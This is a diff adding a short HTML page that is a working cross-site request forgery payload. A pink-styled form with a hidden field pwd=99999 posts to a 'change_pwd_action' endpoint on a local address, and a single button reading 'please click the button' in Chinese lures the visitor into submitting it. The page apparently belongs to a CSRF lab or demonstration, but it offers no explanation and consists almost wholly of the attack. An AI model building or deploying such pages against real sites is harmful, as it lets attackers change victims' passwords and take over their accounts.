@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <style>
+        form{
+            margin: 0 auto;
+            background-color: #ff72d8;
+            width: 300px;
+            height:200px;
+            text-align: center;
+        }
+        #sub{
+            text-align:center;
+            margin: 0 auto;
+            line-height: 200px;
+            {#background-color: green;#}
+            {#color: red;#}
+        }
+    </style>
+</head>
+<body>
+<form  method="post" action="http://192.168.40.1:8000/change_pwd_action">
+    <input type="hidden" name="pwd" value="99999">
+    <input id="sub" type="submit" name="sub" value="请点击按钮">
+</form>
+</body>
+</html>
